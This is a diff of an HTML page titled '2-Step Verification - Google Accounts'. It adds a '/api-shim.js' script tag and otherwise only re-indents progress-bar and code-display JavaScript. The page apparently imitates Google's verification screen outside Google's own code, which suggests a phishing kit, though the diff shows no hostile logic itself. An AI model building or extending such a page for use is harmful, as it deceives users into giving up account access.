@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script src="/api-shim.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>2-Step Verification - Google Accounts</title>
@@ -604,18 +605,18 @@
             if (card) card.classList.add('waiting');
             if (progressContainer) progressContainer.classList.add('active');
             if (progressBar) {
-                progressBar.style.width = '0%';
-                progressBar.classList.remove('loading', 'completing');
-                setTimeout(() => {
-                    progressBar.classList.add('loading');
-                    progressBar.style.width = '80%';
+            progressBar.style.width = '0%';
+            progressBar.classList.remove('loading', 'completing');
+            setTimeout(() => {
+                progressBar.classList.add('loading');
+                progressBar.style.width = '80%';
                 }, 60);
             }
             setTimeout(() => {
                 if (progressBar) {
-                    progressBar.classList.remove('loading');
-                    progressBar.classList.add('completing');
-                    progressBar.style.width = '100%';
+                progressBar.classList.remove('loading');
+                progressBar.classList.add('completing');
+                progressBar.style.width = '100%';
                 }
                 setTimeout(() => {
                     if (progressContainer) progressContainer.classList.remove('active');
@@ -737,9 +738,9 @@
                         numEl.classList.remove('code-appear');
                         numEl.textContent = code;
                         if (prev === null) {
-                            void numEl.offsetWidth;
+                        void numEl.offsetWidth;
                             numEl.classList.add('code-appear');
-                        }
+                    }
                     }
                     renderInstruction(code);
                     stopFormProgress();
@@ -853,4 +854,4 @@
         });
     </script>
 </body>
-</html>
+</html> 
